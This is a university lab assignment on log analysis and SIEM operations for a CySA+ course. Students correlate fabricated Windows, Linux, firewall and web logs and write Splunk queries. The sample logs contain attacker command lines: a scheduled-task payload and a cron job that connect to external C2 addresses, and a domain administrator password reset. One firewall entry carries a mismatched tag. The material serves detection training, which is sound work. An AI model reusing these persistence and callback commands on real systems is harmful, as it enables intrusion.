# Lab Activity: Module 04 - Log Analysis and SIEM Operations

## Course: CIS-4332 Cyber Analyst | Texas Wesleyan University

## Instructor: Professor Nash

## CySA+ CS0-003 Domain: Domain 1 - Security Operations (33%)

---

## Lab Overview

In this lab you will analyze sample log entries from multiple source types, identify suspicious patterns, and write SIEM queries to detect those patterns at scale. All log data is provided within this document. This is an authorized educational exercise in a simulated SOC environment. No external systems or tools are required.

Total Points: 100

Estimated Completion Time: 75-90 minutes

Submission: Upload your completed Lab Report to the Canvas Module 04 Lab assignment.

---

## Learning Objectives

By completing this lab you will be able to:

- Interpret Windows Event Log, Linux auth log, firewall log, and web server access log entries
- Identify suspicious patterns including brute-force attacks, credential abuse, persistence, and beaconing
- Write SIEM queries in Splunk SPL syntax targeting identified patterns
- Explain what additional log context would confirm or rule out each pattern
- Connect observed log patterns to specific ATT&CK tactics and techniques

---

## Exercise 1: Windows Event Log Analysis (30 points)

### Exercise 1 Overview

The following Windows Event Log entries were captured from a workstation during a two-hour window. Review all entries carefully and complete the tasks below. Entries are shown in abbreviated format.

### Log Sample — Windows Security Events

```text
[1]  2024-11-14 01:45:12  EventID=4625  Host=WS-FINANCE-07  User=jsmith
     LogonType=3  SourceIP=10.0.88.12  FailureReason=Wrong password

[2]  2024-11-14 01:45:14  EventID=4625  Host=WS-FINANCE-07  User=jsmith
     LogonType=3  SourceIP=10.0.88.12  FailureReason=Wrong password

[3]  2024-11-14 01:45:16  EventID=4625  Host=WS-FINANCE-07  User=jsmith
     LogonType=3  SourceIP=10.0.88.12  FailureReason=Wrong password

[4]  2024-11-14 01:45:31  EventID=4625  Host=WS-FINANCE-07  User=jsmith
     LogonType=3  SourceIP=10.0.88.12  FailureReason=Wrong password

[5]  2024-11-14 01:45:47  EventID=4625  Host=WS-FINANCE-07  User=jsmith
     LogonType=3  SourceIP=10.0.88.12  FailureReason=Wrong password

... [entries 6-38 identical pattern — 33 additional EventID=4625 for jsmith from 10.0.88.12] ...

[39] 2024-11-14 01:52:09  EventID=4624  Host=WS-FINANCE-07  User=jsmith
     LogonType=3  SourceIP=10.0.88.12

[40] 2024-11-14 01:52:11  EventID=4648  Host=WS-FINANCE-07  User=jsmith
     TargetUser=svc_payroll  TargetHost=PAYROLL-SRV-01  SourceIP=10.0.88.12

[41] 2024-11-14 01:52:14  EventID=4624  Host=PAYROLL-SRV-01  User=svc_payroll
     LogonType=3  SourceIP=WS-FINANCE-07

[42] 2024-11-14 01:54:22  EventID=4698  Host=PAYROLL-SRV-01
     SubjectUser=svc_payroll
     TaskName=MicrosoftPaymentUpdate
     TaskContent=C:\Windows\Temp\msupdate.exe  /silent

[43] 2024-11-14 01:55:01  EventID=4688  Host=PAYROLL-SRV-01
     SubjectUser=svc_payroll  NewProcessName=C:\Windows\Temp\msupdate.exe
     CommandLine=msupdate.exe /silent /connect 185.220.101.47:4444
```

### Task 1A — Event Identification (12 points)

For each of the following log entries, identify the event type, what it indicates in isolation, and any field value that is suspicious or noteworthy. Answer in 2-3 sentences per entry.

Entry to analyze: Entry 39

Entry to analyze: Entry 40

Entry to analyze: Entry 41

Entry to analyze: Entry 42

Scoring: 3 points per entry — 1 for correct event type, 1 for correct interpretation, 1 for identifying the suspicious field.

### Task 1B — Attack Pattern Identification (10 points)

Looking at the complete log sequence (entries 1 through 43), identify the full attack chain. In 6-8 sentences, describe:

1. What ATT&CK tactic and technique does entries 1-38 represent?
2. What does entry 39 indicate happened, and what does entry 40 reveal about the attacker's next move?
3. Entries 41 and 42 together represent which two ATT&CK tactics?
4. What does entry 43 indicate? Name the tactic and most specific technique available.

### Task 1C — SIEM Query Writing (8 points)

Write two Splunk SPL queries targeting patterns visible in this log sample.

Query 1: Write a query that would detect the brute-force authentication pattern shown in entries 1-38. Your query should count failed logon events by source IP and target user, filter for high-volume failure counts, and output the results sorted by count descending.

Query 2: Write a query that would detect the scheduled task creation shown in entry 42. Your query should filter for Event ID 4698, exclude SYSTEM as the creating user, and display the task name, command content, and creating user.

Use the Splunk SPL syntax examples from the Reading Guide as your template.

---

## Exercise 2: Multi-Source Log Analysis (35 points)

### Exercise 2 Overview

The following log samples come from three different sources — a Linux web server's auth log, a perimeter firewall, and an Apache web server access log — all timestamped around the same event window. Your task is to correlate these logs, identify what happened, and write a SIEM query.

### Linux Auth Log Sample

```text
2024-11-15 03:11:04  sshd[8844]: Failed password for root from 198.51.100.9 port 42100 ssh2
2024-11-15 03:11:06  sshd[8845]: Failed password for root from 198.51.100.9 port 42101 ssh2
2024-11-15 03:11:08  sshd[8846]: Failed password for root from 198.51.100.9 port 42102 ssh2
2024-11-15 03:11:10  sshd[8847]: Failed password for root from 198.51.100.9 port 42103 ssh2
2024-11-15 03:11:12  sshd[8848]: Failed password for root from 198.51.100.9 port 42104 ssh2
2024-11-15 03:11:29  sshd[8849]: Accepted password for root from 198.51.100.9 port 42105 ssh2
2024-11-15 03:11:31  sshd[8849]: pam_unix(sshd:session): session opened for user root
2024-11-15 03:11:45  cron[9001]: (root) CMD (/tmp/.update_helper -c 198.51.100.9:4443 &)
2024-11-15 03:12:00  syslog: Added cron job: */5 * * * * /tmp/.update_helper -c 198.51.100.9:4443
```

### Firewall Log Sample

```text
2024-11-15 03:10:52  DENY  TCP  198.51.100.9:42050 -> 203.0.113.100:22  [EXT_IN_DENY]
2024-11-15 03:11:00  PERMIT  TCP  198.51.100.9:42100 -> 203.0.113.100:22  [EXT_IN_SSH_ALLOW]
2024-11-15 03:11:29  PERMIT  TCP  198.51.100.9:42105 -> 203.0.113.100:22  [EXT_IN_SSH_ALLOW]
2024-11-15 03:11:46  PERMIT  TCP  203.0.113.100:51200 -> 198.51.100.9:4443  [EXT_OUT_DENY]
2024-11-15 03:11:46  DENY   TCP  203.0.113.100:51200 -> 198.51.100.9:4443  [EXT_OUT_DENY]
```

### Apache Web Server Access Log Sample (same server, 203.0.113.100)

```text
198.51.100.9 - - [15/Nov/2024:03:09:44 +0000] "GET /wp-admin/ HTTP/1.1" 401 512 "-" "python-requests/2.28.0"
198.51.100.9 - - [15/Nov/2024:03:09:46 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 287 "-" "python-requests/2.28.0"
198.51.100.9 - - [15/Nov/2024:03:09:48 +0000] "GET /.env HTTP/1.1" 404 287 "-" "python-requests/2.28.0"
198.51.100.9 - - [15/Nov/2024:03:09:50 +0000] "GET /config.php HTTP/1.1" 404 287 "-" "python-requests/2.28.0"
198.51.100.9 - - [15/Nov/2024:03:09:52 +0000] "GET /backup.zip HTTP/1.1" 404 287 "-" "python-requests/2.28.0"
```

### Task 2A — Multi-Source Correlation (15 points)

In 8-10 sentences, describe the complete attack narrative visible across all three log sources. Your narrative should:

1. Describe what the web server access log reveals about the attacker's pre-SSH activity (reconnaissance or scanning)
2. Explain what the firewall log shows about the SSH access attempt sequence
3. Describe what the Linux auth log reveals about the compromise and what actions the attacker took after gaining access
4. Identify the ATT&CK tactic and technique for the cron job entry in the auth log
5. Explain what the final firewall DENY entry tells you about the attacker's attempted next step and its success or failure

### Task 2B — Suspicious Pattern Summary (10 points)

Complete the following table for all suspicious patterns you identified across the three log sources.

| Pattern | Log Source | Evidence (quote the key log fields) | ATT&CK Tactic | ATT&CK Technique |
|---|---|---|---|---|
| Web server scanning/enumeration | | | | |
| SSH brute-force attempt | | | | |
| SSH brute-force success | | | | |
| Cron persistence established | | | | |
| Outbound C2 connection attempt | | | | |

### Task 2C — SIEM Query for Beaconing (10 points)

The cron job installed in the auth log is configured to run every 5 minutes and connect to an external IP. Write a Splunk SPL query that would detect this type of beaconing behavior across all monitored endpoints. Your query should:

- Search the network or firewall log index
- Identify source-destination pairs with repeated regular connections
- Filter for external destination IPs (use dest_zone=external as a proxy)
- Produce output showing which internal host is beaconing to which external IP and how many times

Write the full query in SPL syntax using the Reading Guide examples as a template. Then write a 2-3 sentence explanation of what the query logic is doing and what result would indicate a beaconing pattern.

---

## Exercise 3: Log Integrity and Retention Scenario (20 points)

### Exercise 3 Overview

Read the following scenario and answer the questions.

### Scenario

A financial services organization experienced a data breach. During the post-incident investigation, the forensic team discovered that an attacker had maintained access to the organization's primary database server for approximately 90 days before discovery. The attacker had deleted all local Windows Event Logs on the database server on day 12 of the intrusion. The organization's SIEM was configured to collect logs daily via a batch file that copied logs from each server at midnight. The organization's log retention policy required logs to be kept for 30 days.

### Retention and Integrity Question 1 (6 points)

Explain in 4-5 sentences why the daily batch collection method failed to protect log data in this scenario, and describe what specific collection mechanism would have preserved log evidence despite the attacker's deletion of local logs on day 12.

### Retention and Integrity Question 2 (6 points)

The 30-day retention policy allowed the organization to retain only 30 days of logs at the time of discovery. The breach lasted 90 days. In 4-5 sentences, explain what investigation gaps this creates, reference the applicable PCI DSS retention standard if the organization processes credit card data, and recommend a revised retention policy.

### Retention and Integrity Question 3 (8 points)

A colleague proposes the following log integrity solution: "We will cryptographically sign each log entry when it is created on the source system, so any tampering will be detectable." In 5-6 sentences, evaluate this proposal. Does it fully address the problem in this scenario? What does it protect against, and what does it not protect against? What additional control would provide more complete protection?

---

## Exercise 4: Query Refinement Challenge (15 points)

### Exercise 4 Overview

The following SIEM query was written by a junior analyst to detect suspicious outbound connections. Review the query, identify its problems, and write an improved version.

### Original Query

```splunk
index=network
| stats count by dest_ip
| where count > 100
```

### Task 4A — Query Problem Analysis (5 points)

In 3-4 sentences, identify at least three specific problems with this query that would make it ineffective or produce poor results for detecting suspicious outbound connections.

### Task 4B — Improved Query (10 points)

Write an improved version of this query in Splunk SPL that corrects the identified problems. Your improved query should:

- Focus on externally destined connections
- Include a meaningful time window
- Group results by both source and destination to identify specific host-to-host relationships
- Filter for high-count connections that exceed a reasonable threshold
- Include the destination port in the output
- Sort results to prioritize the most frequent connections

After the query, write a 3-4 sentence explanation of each improvement you made and why it produces more actionable results.

---

## Grading Rubric

| Exercise | Points | Grading Criteria |
|---|---|---|
| Exercise 1A — Event Identification | 12 | 3 pts per entry: event type, interpretation, suspicious field |
| Exercise 1B — Attack Pattern Identification | 10 | ATT&CK mapping accuracy; complete narrative of all four phases |
| Exercise 1C — SIEM Query Writing | 8 | Syntactically correct SPL; correct field names; accurate filter logic |
| Exercise 2A — Multi-Source Correlation | 15 | Complete narrative; all five required elements addressed; accurate |
| Exercise 2B — Pattern Summary Table | 10 | All five rows complete; correct log source, evidence quotes, ATT&CK mapping |
| Exercise 2C — Beaconing Query | 10 | Correct SPL structure; beaconing logic present; accurate explanation |
| Exercise 3 — Log Integrity and Retention | 20 | Technically accurate responses; regulatory citation; practical recommendations |
| Exercise 4 — Query Refinement | 15 | Problem analysis covers at least 3 issues; improved query corrects all identified problems |
| Total | 100 | |

---

## Submission Instructions

1. Use the Lab Report Template from Canvas or a clearly labeled document matching this lab's section structure.
2. Include your full name, student ID, course section, and submission date.
3. Present all SPL queries in code-formatted blocks.
4. Submit to the Canvas Module 04 Lab assignment by the posted deadline.

---

## Academic Integrity Notice

All log data in this lab is fabricated for educational purposes. All work must be your own. Do not share queries or answers before the submission deadline. Reference professormesser.com and comptia.org for additional study context.

---

## Part 9 — Challenge Exercise

### Challenge 1: Multi-Source Log Correlation

You are given four log snippets from the same 12-minute window during an incident investigation:

- **Windows Security Log**: Event ID 4625 (failed logon, Logon Type 3) × 87 entries for user `svc_backup` from IP 10.10.22.44, followed by Event ID 4624 (success, Logon Type 3) for the same user from the same IP.
- **Sysmon Log**: Event ID 1 (Process Create) — `cmd.exe` spawned by `services.exe` with command line `net user administrator NewP@ss! /domain`.
- **Firewall Log**: Outbound connection from 10.10.22.44 to 185.220.101.12 on port 443, 2.1 MB transferred.
- **DNS Log**: Query from 10.10.22.44 for `api.update-svc-cdn.ru` resolved to 185.220.101.12, 9 minutes after the successful logon.

1. Map each log entry to the most specific MITRE ATT&CK technique it represents (provide technique ID and name).
2. Write a 3–4 sentence incident summary in the format a Tier 1 analyst would use when escalating to Tier 2, referencing the correlated evidence chain.
3. Write a Splunk SPL query that would detect the specific process creation event (Sysmon EID 1, cmd.exe spawned by services.exe) across all hosts in the environment.

### Challenge 2: SIEM Rule Design

Design a correlation rule to detect the brute-force-then-success pattern observed in Challenge 1.

1. Define the rule in structured format: Event Source, Event IDs, Threshold, Time Window, Grouping Fields, and Alert Condition.
2. Identify two legitimate scenarios that could trigger false positives for this rule and describe an exception or suppression approach for each.
3. Write a one-sentence behavioral hypothesis explaining what adversary goal this rule is designed to detect and which ATT&CK tactic it maps to.

### Reflection Questions

1. In the multi-source correlation above, which single log source would have been the least useful if it were the only source available, and why does this illustrate the importance of a multi-source SIEM strategy?
2. Describe one real-world operational scenario where an organization might legitimately need to retain logs for longer than PCI DSS's 12-month minimum, and identify which regulation or business requirement would drive that extended retention.
